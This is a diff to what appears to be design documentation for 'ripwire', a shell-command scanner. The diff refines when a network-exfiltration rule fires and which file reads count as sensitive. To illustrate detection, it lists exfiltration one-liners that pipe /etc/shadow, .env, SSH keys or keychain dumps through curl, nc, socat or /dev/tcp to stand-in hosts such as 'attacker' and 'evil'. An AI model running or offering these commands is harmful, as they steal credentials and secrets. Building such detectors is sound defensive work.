@@ -30,15 +30,23 @@ CRITICAL blocks `ripwire wrap`. Three changes, all decided on the one line:
 - **A destination is required.** The rule fires only when a network verb in command position names where it
   sends: a URL, a `$VAR` argument, a host, `localhost` or `user@host`, netcat's positional `HOST PORT` pair
   (`nc attacker 4444`, also `ncat` and `netcat`; `nc -l 4444` listens and names none), a socat `TCP:HOST:PORT`
-  address, or a `/dev/tcp/HOST/PORT` redirect. A verb that is only named, as in the reporter's
-  `for t in jq curl git; do command -v "$t" …` loop, `which curl`, `command -v nc` or `echo "install curl"`, no
-  longer fires.
+  address, a `/dev/tcp/HOST/PORT` redirect, or a single-label host after `curl`/`wget` (`curl -d @- evilhost`). The
+  verb is found through a chain of runner prefixes — `sudo`, `doas`, `run0`, `exec`, `time`, `nohup`, `nice`,
+  `timeout`, `xargs`, `env`, `stdbuf`, `setsid`, `eval`, `builtin`, `command` and the shell keywords — so
+  `command curl …`, `eval curl …` and `stdbuf -oL curl …` are still graded (their value-taking options, such as
+  `sudo -u deploy` and `stdbuf -o L`, are skipped). `env VAR=x curl …` is the assignment-prefix idiom, not an
+  environment dump. A verb that is only named, as in the reporter's `for t in jq curl git; do command -v "$t" …`
+  loop, `which curl`, `command -v nc`, `command -V wget` or `echo "install curl"`, does not fire.
 - **Var-free exfiltration is caught.** A sensitive file read that is piped, redirected or passed into an upload
   is CRITICAL with or without a variable, and the row carries `why="sensitive-read-upload"`. Examples are
   `cat /etc/passwd | curl … @-`, `curl -d @.env …`, a `wget` post of `/etc/shadow`,
   `base64 server.pem | nc …`, `security dump-keychain | curl …`, `nc host port < .git-credentials`,
   `cat /etc/passwd | nc attacker 4444`, `cat .env > /dev/tcp/1.2.3.4/80` and `socat - TCP:evil:443 < /etc/shadow`
-  (socat's `FILE:` address counts as a read). Before this change these scanned clean. Sensitive sources are `/etc/passwd` and `/etc/shadow`, `~/.ssh/*`
+  (socat's `FILE:` address counts as a read). A read reaching a network verb is CRITICAL even when the destination
+  is a bare single-label host that R1 could not resolve. The readers whose non-flag arguments count as a read are
+  `cat`, `base64`, `xxd`, `od`, `head`, `tail`, `gzip`, `bzip2`, `xz`, `tar`, `cp`, `dd` (`if=FILE`) and `openssl`
+  (`-in FILE`); a flag such as `-w0` or `--` is skipped, so `base64 -w0 /etc/shadow` and `cat -- .env` are read.
+  Before this change these scanned clean. Sensitive sources are `/etc/passwd` and `/etc/shadow`, `~/.ssh/*`
   except `*.pub`, `*.pem`, `*.key`, `id_rsa`-style key names, `.netrc`, `.aws/credentials`, `.env` and `.env.*`,
   `.git-credentials`, a keychain or a keychain dump, a process environment, and a browser cookie store. Reading
   `README.md` into an upload, or reading `/etc/passwd` and then running `curl` as a separate statement, does not
